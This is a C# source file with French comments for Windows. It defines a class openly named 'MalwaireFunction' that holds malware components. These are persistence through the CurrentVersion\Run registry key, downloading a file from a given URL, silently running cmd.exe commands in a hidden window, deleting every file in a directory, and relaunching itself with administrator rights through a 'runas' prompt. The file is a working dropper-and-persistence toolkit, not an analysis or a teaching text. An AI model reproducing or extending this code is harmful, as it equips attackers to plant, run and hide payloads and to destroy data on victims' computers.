#if WINDOWS
using System;
using System.IO;
using System.Net.Http;
using System.Security.Principal;
using System.Diagnostics;

 
using Microsoft.Win32;


namespace Lfd{
    public class MalwaireFunction{

        
        
         
        public static void KeyRegister(string exePath, string nameKey){
            string registryKeyName = nameKey;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true)){
                if (key != null){
                    key.SetValue(registryKeyName, exePath);
                }else{

                }
            }
        }
        


        public static void donload(string url, string file){
            using (var client = new HttpClient()){
                using (var s = client.GetStreamAsync(url)){
                    using (var fs = new FileStream(file, FileMode.OpenOrCreate)){
                        s.Result.CopyTo(fs);
                    }
                }
            }
        }

        public static bool fileExiste(string file){ 
            return File.Exists(file) ? true : false;
        }


         
        public static bool IsRunningAsAdministrator(){
            try{
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch{
                return false;
                
            }
        }
        
        

        public static void ClearRepertoirAll(string directory){
            foreach (var file in Directory.GetFiles(directory)){
                File.Delete(file);
            }
        }

            public static void SystemShell(string command){
            // Créer un nouvel objet Process
            Process process = new Process();
            
            // Configurer le processus
            process.StartInfo.FileName = "cmd.exe"; 
            process.StartInfo.Arguments = $"/C {command}"; 
            process.StartInfo.RedirectStandardOutput = false; // Rediriger la sortie
            process.StartInfo.UseShellExecute = false; 
            process.StartInfo.CreateNoWindow = true; 

            // Démarrer le processus
            process.Start();

            process.WaitForExit(); // Attendre la fin de l'exécution
            }

        public static bool DirectoryExistE(string directory){
            if(Directory.Exists(directory)){
                return true;
            }else{
                return  false;
            }
        }

        
        public static bool IsRoot(){
            
            if(!IsRunningAsAdministrator()){
                return false;
            }// r'envoi true si il et deja admin et si il et pas admin il renvoi false 

            
            return true;
        }
        

        
        public static void ElevatROOT(bool number){
            if (number == false){
                //elever les privilège

                var processInfo = new ProcessStartInfo{
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", 
                    Arguments = Environment.CommandLine 
                };

                try{
                    Process.Start(processInfo);
                    Environment.Exit(0);
                }catch (Exception ex){
                    Console.WriteLine("Error : " + ex.Message);
                }
                
            }else{
                // les privilège sont déjà élever
                //Console.WriteLine("Programme qui et deja executer en mode admin, ou vous n'êtes pas sous windows");
            }
        }
        



};
}

#endif
